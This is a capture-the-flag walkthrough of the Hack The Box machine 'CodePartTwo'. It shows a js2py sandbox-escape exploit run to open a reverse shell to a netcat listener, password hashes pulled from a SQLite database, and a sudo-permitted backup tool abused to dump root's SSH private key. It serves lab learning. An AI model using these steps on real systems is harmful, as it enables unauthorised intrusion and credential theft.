---
created: 2026-02-08
tags:
  - seed
  - ctf
title: HTB - CodePartTwo
---
## How many open TCP ports are listening on CodePartTwo?

The initial enumeration phase involves scanning the target to identify active services:

```js
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ rustscan -a 10.129.232.59 --ulimit 5000
...
Open 10.129.232.59:22
Open 10.129.232.59:8000

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
```

---

## What is the version of the js2py library being used by the application?

- Open website with port 8000
- Download app via "DOWNLOAD APP" button
- Inspect dependencies in `requirements.txt` to identify the specific library version:
    

```js
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ unzip app.zip
...
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cat app/requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

---

## Which CVE number corresponds to the sandbox escape vulnerability in js2py that the application uses?

A search for sandbox escape vulnerabilities in `js2py 0.74` points to a specific security advisory:

`https://github.com/naclapor/CVE-2024-28397`

---

## What is the name of the database used by the application?

### Setup Exploit

Clone the exploit repository and initialize the Python environment using `uv` to manage dependencies:

```js
┌──(kali㉿kali)-[~/Desktop]
└─$ git clone https://github.com/naclapor/CVE-2024-28397.git && cd CVE-2024-28397
...
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv init
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv venv
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv pip install requests
```

### Netcat Listener

Prepare a listener to intercept the reverse shell connection:

```js
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ nc -lnvp 4444
```

### Exploit Execution

Run the exploit targeting the vulnerable `/run_code` endpoint to trigger Remote Code Execution (RCE):

```js
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv run python exploit.py --target http://10.129.232.59:8000/run_code --lhost 10.10.14.236 --lport 4444
...
[+] Payload sent successfully!
[+] Response: {"error":"'NoneType' object is not callable"}
```

### Reverse Shell Access

After the payload executes, upgrade the shell to a full TTY and locate the application's database file:

```js
python3 -c 'import pty; pty.spawn("/bin/bash")'

app@codeparttwo:~/app$ ls instance
users.db
```

---

## What is the recovered password for the user marco?

Extract the user password hashes directly from the SQLite database file:

```js
app@codeparttwo:~/app$ cat instance/users.db
...
Mmarco649c9d65a206a75f5abe509fe128bce5
```

The recovered MD5 hash `649c9d65a206a75f5abe509fe128bce5` for user `marco` can be cracked using online rainbow tables like [CrackStation](https://crackstation.net).

---

## Submit the flag located in the marco user's home directory.

Establish an SSH session using the cracked credentials for user `marco`:

```js
┌──(kali㉿kali)-[~]
└─$ ssh marco@10.129.232.59
marco@10.129.232.59's password:
marco@codeparttwo:~$ cat user.txt
```

---

## What is the full path to the backup utility that the marco user can run as root without a password?

Check the sudo configurations to identify potential privilege escalation vectors:

```js
marco@codeparttwo:~$ sudo -l
...
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

---

### What is the full backup path defined in the npbackup configuration file found in marco’s home directory?

Examine the contents of the `npbackup.conf` file to understand the backup routine:

```js
marco@codeparttwo:~$ cat npbackup.conf
...
    backup_opts:
      paths:
      - /home/app/app/
```

---

## Submit the flag located in the root user's home directory.

### Modify Configuration

Abuse the backup utility by creating a custom configuration file that targets the `/root` directory:

```js
marco@codeparttwo:~$ cp npbackup.conf npbackup1.conf
marco@codeparttwo:~$ vi npbackup1.conf
# Change target path from /home/app/app/ to /root
```

### Run Backup with Root Privileges

Execute the backup utility using the modified configuration:

```js
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
...
2026-02-08 12:20:28,486 :: INFO :: Running backup of ['/root'] to repo default
snapshot b6138687 saved
```

### Extract Root SSH Credentials

Since the utility is running as root, it can backup and dump sensitive files like the root SSH private key:


```js
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

### Final Root Access

Save the dumped key to your local machine, adjust the file permissions, and log in as the root user:

```js
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ chmod 600 id_rsa
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ssh -i id_rsa root@10.129.232.59

root@codeparttwo:~# cat root.txt
```
